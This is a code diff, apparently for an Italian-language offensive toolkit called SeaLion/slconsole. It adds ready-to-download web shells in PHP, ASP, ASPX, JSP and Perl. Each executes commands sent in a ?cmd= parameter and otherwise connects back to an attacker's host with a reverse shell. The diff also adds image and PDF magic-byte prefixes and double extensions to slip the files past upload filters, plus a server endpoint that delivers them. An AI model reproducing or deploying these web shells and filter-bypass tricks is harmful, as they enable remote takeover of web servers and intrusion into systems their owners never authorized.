@@ -357,6 +357,135 @@ REVSHELL_PYTHON = (
     "subprocess.call([\"/bin/bash\",\"-i\"])'\n"
 )
 
+# ---------------------------------------------------------------------------
+# WebShell to RCE — webshell con reverse shell integrata
+# ---------------------------------------------------------------------------
+# Ogni template usa {lhost} e {lport}: al download vengono compilati.
+# Visitando la pagina senza parametri parte la reverse shell verso il
+# listener socat; con ?cmd= si ottiene esecuzione comandi singola.
+
+WEBSHELL_PHP = """<?php
+// SeaLion WebShell-to-RCE (php)
+$LHOST = "{lhost}"; $LPORT = {lport};
+if (isset($_REQUEST['cmd'])) {{ system($_REQUEST['cmd']); exit; }}
+$sock = @fsockopen($LHOST, $LPORT);
+if ($sock) {{
+    $proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+}}
+?>
+"""
+
+WEBSHELL_ASP = '''<%
+' SeaLion WebShell-to-RCE (classic asp)
+If Request("cmd") <> "" Then
+    Set sh = CreateObject("WScript.Shell")
+    Set ex = sh.Exec("cmd.exe /c " & Request("cmd"))
+    Response.Write(ex.StdOut.ReadAll())
+Else
+    Set sh = CreateObject("WScript.Shell")
+    sh.Run "powershell -nop -c ""$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($o2);$s.Write($sb,0,$sb.Length);$s.Flush()}}""", 0, True
+End If
+%>
+'''
+
+WEBSHELL_ASPX = """<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Net.Sockets" %>
+<%
+// SeaLion WebShell-to-RCE (aspx)
+if (Request["cmd"] != null) {{
+    Process p = new Process();
+    p.StartInfo.FileName = "cmd.exe";
+    p.StartInfo.Arguments = "/c " + Request["cmd"];
+    p.StartInfo.RedirectStandardOutput = true;
+    p.StartInfo.UseShellExecute = false;
+    p.Start();
+    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
+}} else {{
+    try {{
+        TcpClient c = new TcpClient("{lhost}", {lport});
+        Stream s = c.GetStream();
+        Process p = new Process();
+        p.StartInfo.FileName = "cmd.exe";
+        p.StartInfo.RedirectStandardInput = true;
+        p.StartInfo.RedirectStandardOutput = true;
+        p.StartInfo.UseShellExecute = false;
+        p.Start();
+        StreamWriter sw = new StreamWriter(s);
+        sw.AutoFlush = true;
+        new System.Threading.Thread(() => {{
+            int r; byte[] buf = new byte[4096];
+            while ((r = s.Read(buf, 0, buf.Length)) > 0)
+                p.StandardInput.BaseStream.Write(buf, 0, r);
+        }}).Start();
+        new System.Threading.Thread(() => {{
+            int r; char[] buf = new char[4096];
+            while ((r = p.StandardOutput.Read(buf, 0, buf.Length)) > 0)
+                sw.Write(buf, 0, r);
+        }}).Start();
+        p.WaitForExit();
+    }} catch {{}}
+}}
+%>
+"""
+
+WEBSHELL_JSP = """<%@ page import="java.io.*" %>
+<%
+// SeaLion WebShell-to-RCE (jsp)
+String cmd = request.getParameter("cmd");
+if (cmd != null) {{
+    Process p = Runtime.getRuntime().exec(cmd);
+    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String l; while ((l = r.readLine()) != null) {{ out.println(l); }}
+}} else {{
+    String host = "{lhost}"; int port = {lport};
+    String shell = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd.exe" : "/bin/bash";
+    Process p = new ProcessBuilder(shell).redirectErrorStream(true).start();
+    java.net.Socket s = new java.net.Socket(host, port);
+    InputStream pi = p.getInputStream(), si = s.getInputStream();
+    OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+    while (!s.isClosed()) {{
+        while (pi.available() > 0) so.write(pi.read());
+        while (si.available() > 0) po.write(si.read());
+        so.flush(); po.flush();
+        Thread.sleep(50);
+        try {{ p.exitValue(); break; }} catch (Exception e) {{}}
+    }}
+    p.destroy(); s.close();
+}}
+%>
+"""
+
+WEBSHELL_PERL = """#!/usr/bin/perl
+# SeaLion WebShell-to-RCE (perl cgi)
+use CGI; use Socket;
+my $q = CGI->new; print $q->header("text/plain");
+if (my $c = $q->param("cmd")) {{ print `$c`; exit; }}
+socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
+connect(S, sockaddr_in({lport}, inet_aton("{lhost}")));
+open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S");
+exec("/bin/sh -i");
+"""
+
+WEBSHELL_TEMPLATES: dict[str, dict[str, str]] = {
+    "php":  {"label": "PHP (.php)",   "ext": "php",  "template": WEBSHELL_PHP},
+    "asp":  {"label": "ASP (.asp)",   "ext": "asp",  "template": WEBSHELL_ASP},
+    "aspx": {"label": "ASPX (.aspx)", "ext": "aspx", "template": WEBSHELL_ASPX},
+    "jsp":  {"label": "JSP (.jsp)",   "ext": "jsp",  "template": WEBSHELL_JSP},
+    "perl": {"label": "Perl (.cgi)",  "ext": "cgi",  "template": WEBSHELL_PERL},
+}
+
+# Magic bytes per upload filter bypass (content sniffing / double extension)
+WEBSHELL_FORMATS: dict[str, dict[str, object]] = {
+    "none": {"label": "Nessuno (estensione reale)", "magic": b"", "suffix": ""},
+    "gif":  {"label": ".gif",  "magic": b"GIF89a;\n",                          "suffix": ".gif"},
+    "img":  {"label": ".img",  "magic": b"GIF89a;\n",                          "suffix": ".img"},
+    "jpg":  {"label": ".jpg",  "magic": b"\xff\xd8\xff\xe0" + b"\x00" * 12,    "suffix": ".jpg"},
+    "png":  {"label": ".png",  "magic": b"\x89PNG\r\n\x1a\n" + b"\x00" * 8,    "suffix": ".png"},
+    "pdf":  {"label": ".pdf",  "magic": b"%PDF-1.4\n",                         "suffix": ".pdf"},
+}
+
 INDEX_TEMPLATE = """<!DOCTYPE html>
 <html><head><title>slconsole delivery</title></head><body>
 <h2>slconsole — Quick Delivery Server</h2>
@@ -4299,6 +4428,47 @@ def _page_delivery() -> str:
 <div class="dc-prereq">{prereq}</div>
 </div>\n"""
 
+    ws_type_opts = ""
+    for key, entry in WEBSHELL_TEMPLATES.items():
+        sel = " selected" if key == "php" else ""
+        ws_type_opts += f'<option value="{key}"{sel}>{html.escape(entry["label"])}</option>\n'
+    ws_fmt_opts = ""
+    for key, entry in WEBSHELL_FORMATS.items():
+        ws_fmt_opts += f'<option value="{key}">{html.escape(str(entry["label"]))}</option>\n'
+
+    webshell_card = f"""<h3 style="margin:24px 0 12px;color:var(--text)">WebShell to RCE</h3>
+<div class="delivery-card">
+<div class="dc-header"><span class="dc-endpoint">/api/webshell</span><span class="dc-title">WebShell to RCE</span></div>
+<div class="dc-desc">WebShell con reverse shell integrata: appena visitata dal server web si connette al tuo listener. Con <code>?cmd=</code> esegue comandi singoli (RCE via web). Scegli il tipo, opzionalmente un formato con magic bytes per bypassare i filtri di upload (doppia estensione), e scarica il file pronto.</div>
+<div style="display:flex;gap:12px;flex-wrap:wrap;align-items:center;margin:10px 0">
+<label style="font-size:12px;color:var(--text2)">Tipo
+<select id="ws-type" style="margin-left:6px;background:var(--surface);color:var(--accent);border:1px solid var(--border);border-radius:4px;padding:4px 8px;font-family:monospace;font-size:13px">
+{ws_type_opts}</select></label>
+<label style="font-size:12px;color:var(--text2)">Formato
+<select id="ws-fmt" style="margin-left:6px;background:var(--surface);color:var(--accent);border:1px solid var(--border);border-radius:4px;padding:4px 8px;font-family:monospace;font-size:13px">
+{ws_fmt_opts}</select></label>
+<button onclick="wsDownload()" style="background:var(--surface);color:var(--accent);border:1px solid var(--border);border-radius:4px;padding:5px 14px;font-size:12px;cursor:pointer">⬇ Scarica</button>
+</div>
+<div class="dc-cmd"><code id="ws-url"></code></div>
+<div class="dc-prereq">Prerequisito: <code>socat file:$(tty),raw,echo=0 tcp-listen:{_lport}</code></div>
+</div>
+<script>
+function wsUpdate(){{
+  var t=document.getElementById('ws-type').value;
+  var f=document.getElementById('ws-fmt').value;
+  document.getElementById('ws-url').textContent=location.origin+'/api/webshell?type='+t+'&fmt='+f;
+}}
+function wsDownload(){{
+  var t=document.getElementById('ws-type').value;
+  var f=document.getElementById('ws-fmt').value;
+  window.location='/api/webshell?type='+t+'&fmt='+f;
+}}
+document.getElementById('ws-type').addEventListener('change',wsUpdate);
+document.getElementById('ws-fmt').addEventListener('change',wsUpdate);
+wsUpdate();
+</script>
+"""
+
     files = []
     if STATIC_ROOT.is_dir():
         files = sorted(f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith("."))
@@ -4343,6 +4513,7 @@ def _page_delivery() -> str:
 <div class="page-sub">{lport_info}</div>
 <h3 style="margin:24px 0 12px;color:var(--text)">Endpoint dinamici</h3>
 {ep_cards}
+{webshell_card}
 <h3 style="margin:24px 0 12px;color:var(--text)">File statici ({len(files)})</h3>
 <div class="table-scroll">
 <table class="log-table" style="font-size:13px">
@@ -4641,6 +4812,8 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
             self._send_text(REVSHELL_BASH.format(**pv))
         elif path == "/sh":
             self._send_text(REVSHELL_PYTHON.format(**pv))
+        elif path == "/api/webshell":
+            self._serve_webshell(qs)
         elif path == "/linseal":
             self._serve_linseal(qs)
         elif path == "/slrecon":
@@ -4814,6 +4987,24 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
         base = f"http://{_lhost}:{self.server.server_address[1]}"
         html = INDEX_TEMPLATE.format(base=base, file_list=file_list, **pv)
         self._send_text(html, content_type="text/html")
+
+    def _serve_webshell(self, qs: dict) -> None:
+        wtype = qs.get("type", ["php"])[0].lower()
+        fmt = qs.get("fmt", ["none"])[0].lower()
+        entry = WEBSHELL_TEMPLATES.get(wtype)
+        fentry = WEBSHELL_FORMATS.get(fmt)
+        if entry is None or fentry is None:
+            self._send_json({"ok": False, "error": "Tipo o formato non valido"}, status=400)
+            return
+        body = entry["template"].format(lhost=_lhost or "LHOST", lport=_lport).encode("utf-8")
+        data = fentry["magic"] + body
+        fname = f"sealion.{entry['ext']}{fentry['suffix']}"
+        self.send_response(200)
+        self.send_header("Content-Type", "application/octet-stream")
+        self.send_header("Content-Length", str(len(data)))
+        self.send_header("Content-Disposition", f'attachment; filename="{fname}"')
+        self.end_headers()
+        self.wfile.write(data)
 
     def _serve_static(self, path: str) -> None:
         name = path.lstrip("/")
